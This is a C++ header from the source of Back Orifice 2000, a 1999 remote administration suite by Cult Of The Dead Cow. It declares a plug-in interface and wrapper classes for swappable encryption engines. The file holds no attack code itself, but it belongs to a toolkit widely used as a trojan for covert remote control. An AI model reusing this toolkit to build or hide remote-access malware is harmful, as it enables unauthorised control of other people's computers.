/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This file is free software, and not subject to GNU Public License
	restrictions; you can redistribute it and/or modify it in any way 
	you see fit. This file is suitable for inclusion in a derivative
	work, regardless of license on the work or availability of source code
	to the work. If you redistribute this file, you must leave this
	header intact.
    
	This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  

	The author of this program may be contacted at dildog@l0pht.com. */

#ifndef __INC_ENCRYPTION_H
#define __INC_ENCRYPTION_H

// Encryption interface

#include<windows.h>

#pragma pack(push, 1)

typedef struct {
	int (__cdecl *pInsert)(void);
	int (__cdecl *pRemove)(void);
	char *(__cdecl *pQuery)(void);

	void *(__cdecl *pStartup)(void);
	int (__cdecl *pShutdown)(void *pInternal);
	int (__cdecl *pSetEncryptKey)(void *pInternal, char *svKey);
	int (__cdecl *pSetDecryptKey)(void *pInternal, char *svKey);
	char *(__cdecl *pGetEncryptKey)(void *pInternal);
	char *(__cdecl *pGetDecryptKey)(void *pInternal);
	BYTE *(__cdecl *pEncrypt)(void *pInternal, BYTE *pBuffer,int nBufLen,int *pnOutBufLen);
	BYTE *(__cdecl *pDecrypt)(void *pInternal, BYTE *pBuffer,int nBufLen,int *pnOutBufLen);
	int (__cdecl *pCreateNewKeys)(void *pInternal);
	void (__cdecl *pFree)(void *pInternal, BYTE *pBuffer);
} ENCRYPTION_ENGINE;

#pragma pack(pop)

#define INVALID_ENCRYPTION_ENGINE ((ENCRYPTION_ENGINE *)NULL)
#define MAX_ENCRYPTION_ENGINES 8

class CEncryptionHandler {

protected:
	ENCRYPTION_ENGINE *m_EncryptionEngine[MAX_ENCRYPTION_ENGINES];
	
public:
	CEncryptionHandler();
	virtual ~CEncryptionHandler();
	virtual int Insert(ENCRYPTION_ENGINE *engine);
	virtual int GetEngineCount(void);
	virtual ENCRYPTION_ENGINE *GetEngine(int nEngine);
	virtual ENCRYPTION_ENGINE *GetEngineByID(char *svID);
	virtual char *Query(int nEngine);
	virtual int Remove(int nEngine);

};

class CEncryptionEngine {

protected:
	ENCRYPTION_ENGINE *m_pEngine;
	void *m_pData;

public:
	CEncryptionEngine(ENCRYPTION_ENGINE *pEngine);
	virtual ~CEncryptionEngine();
	virtual char *Query(void);
	virtual int Startup(void);
	virtual int Shutdown(void);
	virtual int SetEncryptKey(char *pKey);
	virtual int SetDecryptKey(char *pKey);
	virtual char *GetEncryptKey(void);
	virtual char *GetDecryptKey(void);
	virtual BYTE *Encrypt(BYTE *pBuffer,int nBufLen, int *pnOutBufLen);
	virtual BYTE *Decrypt(BYTE *pBuffer,int nBufLen, int *pnOutBufLen);
	virtual int CreateNewKeys(void);
	virtual void Free(BYTE *pBuffer);
};






#endif